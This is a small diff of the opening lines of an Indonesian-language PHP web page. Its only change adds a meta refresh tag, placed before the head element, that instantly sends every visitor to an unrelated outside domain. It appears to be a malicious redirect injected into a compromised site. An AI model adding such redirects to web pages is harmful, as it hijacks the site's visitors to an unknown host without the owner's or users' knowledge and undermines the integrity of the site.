@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="id-ID">
+<meta http-equiv="refresh" content="0; url=http://sirhuka.xyz/">
 
 <head>
     <?php require_once('inc/asc.php'); ?>
